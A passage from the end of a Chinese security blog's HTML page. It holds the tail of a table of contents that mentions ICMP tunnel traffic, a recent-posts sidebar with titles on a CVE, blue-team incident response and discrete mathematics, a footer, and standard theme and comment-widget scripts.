href="#2%E3%80%81ICMP%E9%9A%A7%E9%81%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">26.48.2.</span> <span class="toc-text">2、ICMP隧道流量特征</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E9%9D%B6%E5%9C%BA/%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/%E8%A7%A3%E9%A2%98/" title="分类练习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="分类练习"/></a><div class="content"><a class="title" href="/%E9%9D%B6%E5%9C%BA/%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/%E8%A7%A3%E9%A2%98/" title="分类练习">分类练习</a><time datetime="2024-05-18T02:45:18.126Z" title="发表于 2024-05-18 10:45:18">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/CVE-2024-31828/" title="CVE-2024-31828"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-31828"/></a><div class="content"><a class="title" href="/uncategorized/CVE-2024-31828/" title="CVE-2024-31828">CVE-2024-31828</a><time datetime="2024-05-18T02:45:18.083Z" title="发表于 2024-05-18 10:45:18">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/" title="离散数学"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="离散数学"/></a><div class="content"><a class="title" href="/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/" title="离散数学">离散数学</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队">蓝队</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/%E5%8F%8D%E5%88%B6CS/%E8%93%9D%E9%98%9F-%E5%8F%8D%E5%88%B6CS/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/%E5%8F%8D%E5%88%B6CS/%E8%93%9D%E9%98%9F-%E5%8F%8D%E5%88%B6CS/" title="蓝队">蓝队</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>